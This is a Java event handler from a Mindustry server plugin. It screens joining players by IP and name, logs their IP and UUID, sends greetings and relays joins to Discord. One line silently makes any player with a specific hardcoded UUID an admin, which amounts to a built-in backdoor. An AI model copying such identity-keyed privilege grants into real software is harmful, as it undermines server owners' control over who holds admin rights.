package pandorum.events;

import static pandorum.Misc.*;

import arc.util.Log;
import arc.util.Strings;
import mindustry.game.EventType;
import mindustry.gen.Call;
import pandorum.PandorumPlugin;
import pandorum.comp.*;
import pandorum.comp.Config.PluginType;
import pandorum.effects.Effects;

import java.awt.Color;

public class PlayerJoinEvent {
    public static void call(final EventType.PlayerJoin event) {
        PandorumPlugin.forbiddenIps.each(i -> i.matchIp(event.player.con.address), i -> {
            event.player.con.kick(Bundle.get("events.vpn-ip", findLocale(event.player.locale)));
            return;
        });
        if(PandorumPlugin.config.bannedNames.contains(event.player.name())) {
            event.player.con.kick(Bundle.get("events.unofficial-mindustry", findLocale(event.player.locale)), 60000);
            return;
        }

        sendToChat("server.player-join", colorizedName(event.player));
        Log.info(event.player.name + " зашёл на сервер, IP: " + event.player.ip() + ", ID: " + event.player.uuid());

        Effects.onJoin(event.player);

        if(PandorumPlugin.config.type == PluginType.anarchy || event.player.uuid().equals("GYmJmGDY2McAAAAAN8z4Bg==")) event.player.admin = true;
        Call.infoMessage(event.player.con, Bundle.format("server.hellomsg", findLocale(event.player.locale)));
        bundled(event.player, "server.motd");

        DiscordSender.send(Strings.stripColors(event.player.name), "Зашёл на сервер :)", new Color(110, 237, 139));
    }
}
